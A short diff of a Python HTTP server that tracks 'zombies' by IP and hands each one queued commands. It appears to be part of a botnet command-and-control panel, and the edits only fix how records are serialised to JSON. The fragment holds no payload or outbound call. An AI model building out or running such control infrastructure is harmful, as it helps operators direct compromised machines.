@@ -64,7 +64,7 @@ class ZombieHandler(BaseHTTPRequestHandler):
                     				zombies[ind]['last_seen'] = time.time()
                     				zombies[ind]['command'] = commands
                 			else:
-                    				zombies.append({'ip': client_ip, 'command': commands, 'last_seen': time.time()})
+                    				zombies.append({"ip": client_ip, "command": commands_json, "last_seen": time.time()})
             				with open('zombies.txt', 'w') as f:
                 				for zombie in zombies:
                     					f.write(json.dumps(zombie) + '\n')
@@ -83,7 +83,7 @@ class ControlHandler(BaseHTTPRequestHandler):
 				with open('zombies.txt', 'r') as f:
     					lines = f.readlines()
 				for line in lines:
-					zombies.append(line.strip())
+					zombies.append(json.loads(line.strip()))
                 		data = json.dumps({"zombies": zombies})
                 		self.send_response(200)
                 		self.end_headers()
